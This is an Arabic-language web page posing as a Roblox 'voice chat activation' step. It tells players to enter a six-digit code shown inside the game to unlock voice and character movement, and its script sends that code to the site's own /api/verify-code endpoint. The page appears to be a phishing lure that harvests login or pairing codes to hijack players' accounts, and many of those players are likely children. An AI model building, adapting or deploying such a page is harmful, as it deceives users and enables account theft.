<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل الشات الصوتي - Roblox</title>
    <style>
        * { box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; border-radius: 16px; padding: 32px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h2 { margin-top: 0; color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
        input { width: 100%; padding: 14px; border-radius: 8px; border: 2px solid #334155; background: #0f172a; color: #fff; font-size: 22px; text-align: center; letter-spacing: 4px; margin: 16px 0; outline: none; }
        input:focus { border-color: #38bdf8; }
        button { width: 100%; padding: 14px; border-radius: 8px; border: none; background: #0284c7; color: white; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        button:hover { background: #0369a1; }
        button:disabled { opacity: .5; cursor: not-allowed; }
        #status { margin-top: 16px; font-size: 14px; font-weight: bold; }
        .success { color: #4ade80; }
        .error { color: #f87171; }
    </style>
</head>
<body>

<div class="card">
    <h2>🎙️ تفعيل الشات الصوتي</h2>
    <p>ادخل الرمز الظاهر على شاشتك داخل لعبة روبلوكس لتفعيل الصوت وفك حركة الشخصية.</p>

    <input type="text" id="codeInput" maxlength="6" placeholder="000000">
    <button id="submitBtn">تأكيد ودخول</button>

    <div id="status"></div>
</div>

<script>
    const btn = document.getElementById('submitBtn');
    const input = document.getElementById('codeInput');
    const statusDiv = document.getElementById('status');

    btn.addEventListener('click', async function() {
        const code = input.value.trim();
        if (!code) {
            statusDiv.className = 'error';
            statusDiv.innerText = 'الرجاء كتابة الرمز أولاً!';
            return;
        }

        btn.disabled = true;
        statusDiv.className = '';
        statusDiv.innerText = 'جاري التحقق...';

        try {
            const response = await fetch('/api/verify-code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code })
            });
            const data = await response.json();

            if (data.success) {
                statusDiv.className = 'success';
                statusDiv.innerText = '✅ تم التفعيل بنجاح! ارجع للعبة الآن.';
            } else {
                statusDiv.className = 'error';
                statusDiv.innerText = '❌ ' + (data.message || 'الرمز غير صحيح!');
            }
        } catch (err) {
            statusDiv.className = 'error';
            statusDiv.innerText = '❌ خطأ: ' + err.message;
        } finally {
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
